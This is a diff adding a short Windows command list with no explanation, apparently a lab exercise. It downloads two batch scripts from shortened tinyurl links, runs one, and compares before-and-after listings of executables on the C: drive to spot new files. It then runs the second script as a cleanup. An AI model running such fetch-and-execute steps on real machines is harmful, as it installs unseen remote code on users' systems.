@@ -1,0 +1,37 @@
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://tinyurl.com/jycppyo','C:\Users\%username%\Desktop\run_me.bat')
+
+
+
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://tinyurl.com/h3l4dmr','C:\Users\%username%\Desktop\clean_me.bat')
+
+
+
+cd C:\Users\%username%\Desktop & dir *.bat
+
+
+
+for /r C:\ %A in (*.exe) do echo %A >> 1.txt
+
+
+
+.\run_me.bat
+
+
+
+for /r C:\ %A in (*.exe) do echo %A >> 2.txt
+
+
+
+powershell.exe compare-object (get-content 1.txt) (get-content 2.txt) > 3.txt
+
+
+
+dir *.txt
+
+
+
+type 3.txt
+
+
+
+.\clean_me.bat
